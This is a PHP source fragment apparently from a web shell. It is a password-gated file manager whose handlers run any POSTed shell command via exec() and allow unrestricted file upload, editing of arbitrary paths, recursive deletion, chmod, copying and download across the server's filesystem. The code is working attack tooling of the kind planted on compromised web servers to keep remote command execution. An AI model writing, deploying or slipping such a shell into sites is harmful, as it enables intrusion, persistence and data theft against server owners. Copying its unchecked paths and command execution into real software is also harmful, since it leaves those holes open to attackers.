if (!checkAuth()) {
    loginForm();
}

// ==================== Core Functions ====================

$scriptDir = dirname($_SERVER['SCRIPT_FILENAME']);
$currentDir = isset($_GET['dir']) ? $_GET['dir'] : '';
$showHidden = isset($_GET['show_hidden']) && $_GET['show_hidden'] == '1';

if (!empty($currentDir)) {
    $currentPath = realpath($currentDir);
    if ($currentPath === false) {
        $currentPath = $scriptDir;
        $currentDir = '';
    }
} else {
    $currentPath = $scriptDir;
    $currentDir = '';
}

// ==================== Command Execution ====================
if (isset($_POST['execute_cmd']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    $output = [];
    $return_var = 0;
    
    // Execute command
    exec($command . ' 2>&1', $output, $return_var);
    $cmd_result = implode("\n", $output);
    
    // Store result for display
    $_SESSION['cmd_result'] = $cmd_result;
    $_SESSION['cmd_command'] = $command;
    
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir) . '&cmd=1');
    exit;
}

// ==================== File Operations ====================

// Create folder
if (isset($_POST['create_folder']) && isset($_POST['folder_name'])) {
    $folderName = trim($_POST['folder_name']);
    if (!empty($folderName)) {
        $newPath = $currentPath . DIRECTORY_SEPARATOR . $folderName;
        if (!file_exists($newPath)) {
            mkdir($newPath, 0777, true);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Create file
if (isset($_POST['create_file']) && isset($_POST['file_name'])) {
    $fileName = trim($_POST['file_name']);
    if (!empty($fileName)) {
        $newPath = $currentPath . DIRECTORY_SEPARATOR . $fileName;
        if (!file_exists($newPath)) {
            file_put_contents($newPath, '');
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Upload file (unlimited)
if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
    $fileName = $_FILES['upload_file']['name'];
    $targetPath = $currentPath . DIRECTORY_SEPARATOR . $fileName;
    move_uploaded_file($_FILES['upload_file']['tmp_name'], $targetPath);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Delete file/folder
if (isset($_GET['delete'])) {
    $deletePath = $currentPath . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (file_exists($deletePath)) {
        if (is_file($deletePath)) {
            unlink($deletePath);
        } elseif (is_dir($deletePath)) {
            function rrmdir($dir) {
                if (is_dir($dir)) {
                    $objects = scandir($dir);
                    foreach ($objects as $object) {
                        if ($object != "." && $object != "..") {
                            if (is_dir($dir . DIRECTORY_SEPARATOR . $object)) {
                                rrmdir($dir . DIRECTORY_SEPARATOR . $object);
                            } else {
                                unlink($dir . DIRECTORY_SEPARATOR . $object);
                            }
                        }
                    }
                    rmdir($dir);
                }
            }
            rrmdir($deletePath);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Rename
if (isset($_POST['rename']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $oldPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['old_name'];
    $newPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['new_name'];
    if (file_exists($oldPath) && !file_exists($newPath)) {
        rename($oldPath, $newPath);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Copy
if (isset($_POST['copy']) && isset($_POST['copy_source']) && isset($_POST['copy_target'])) {
    $source = $currentPath . DIRECTORY_SEPARATOR . $_POST['copy_source'];
    $target = $currentPath . DIRECTORY_SEPARATOR . $_POST['copy_target'];
    if (file_exists($source) && !file_exists($target)) {
        if (is_file($source)) {
            copy($source, $target);
        } elseif (is_dir($source)) {
            function rcopy($src, $dst) {
                if (is_dir($src)) {
                    mkdir($dst, 0777, true);
                    $files = scandir($src);
                    foreach ($files as $file) {
                        if ($file != "." && $file != "..") {
                            rcopy($src . DIRECTORY_SEPARATOR . $file, $dst . DIRECTORY_SEPARATOR . $file);
                        }
                    }
                } else {
                    copy($src, $dst);
                }
            }
            rcopy($source, $target);
        }
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Move
if (isset($_POST['move']) && isset($_POST['move_source']) && isset($_POST['move_target'])) {
    $source = $currentPath . DIRECTORY_SEPARATOR . $_POST['move_source'];
    $target = $currentPath . DIRECTORY_SEPARATOR . $_POST['move_target'];
    if (file_exists($source) && !file_exists($target)) {
        rename($source, $target);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// Save file (edit)
if (isset($_POST['save_file']) && isset($_POST['file_path']) && isset($_POST['content'])) {
    $editPath = $_POST['file_path'];
    if (file_exists($editPath) && is_file($editPath)) {
        file_put_contents($editPath, $_POST['content']);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir) . '&edit=' . urlencode(basename($editPath)));
    exit;
}

// Download file
if (isset($_GET['download'])) {
    $downloadPath = $currentPath . DIRECTORY_SEPARATOR . $_GET['download'];
    if (file_exists($downloadPath) && is_file($downloadPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    }
}

// View file
if (isset($_GET['view'])) {
    $viewPath = $currentPath . DIRECTORY_SEPARATOR . $_GET['view'];
    if (file_exists($viewPath) && is_file($viewPath)) {
        $content = file_get_contents($viewPath);
        $mime = mime_content_type($viewPath);
        if (strpos($mime, 'image/') === 0) {
            header('Content-Type: ' . $mime);
            readfile($viewPath);
            exit;
        }
        echo "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>View: " . htmlspecialchars($_GET['view']) . "</title>";
        echo "<style>body{background:#1e1e1e;color:#d4d4d4;font-family:'Consolas','Courier New',monospace;padding:20px;white-space:pre-wrap;word-wrap:break-word;}</style>";
        echo "</head><body>" . htmlspecialchars($content) . "</body></html>";
        exit;
    }
}

// Chmod
if (isset($_POST['chmod']) && isset($_POST['chmod_path']) && isset($_POST['permissions'])) {
    $chmodPath = $currentPath . DIRECTORY_SEPARATOR . $_POST['chmod_path'];
    if (file_exists($chmodPath)) {
        $perms = octdec($_POST['permissions']);
        chmod($chmodPath, $perms);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($currentDir));
    exit;
}

// ==================== Display ====================

$items = scandir($currentPath);
$directories = [];
$files = [];

foreach ($items as $item) {
    if ($item == '.' || $item == '..') continue;
    if (!$showHidden && substr($item, 0, 1) == '.') continue;
    $fullPath = $currentPath . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullPath)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}
sort($directories);
sort($files);
$allItems = array_merge($directories, $files);

$editFile = isset($_GET['edit']) ? $_GET['edit'] : '';
$editPath = $currentPath . DIRECTORY_SEPARATOR . $editFile;
$editContent = '';
if (!empty($editFile) && file_exists($editPath) && is_file($editPath)) {
    $editContent = file_get_contents($editPath);
}

$showCmd = isset($_GET['cmd']) && $_GET['cmd'] == '1';
$cmdResult = isset($_SESSION['cmd_result']) ? $_SESSION['cmd_result'] : '';
$cmdCommand = isset($_SESSION['cmd_command']) ? $_SESSION['cmd_command'] : '';
unset($_SESSION['cmd_result']);
unset($_SESSION['cmd_command']);

?>
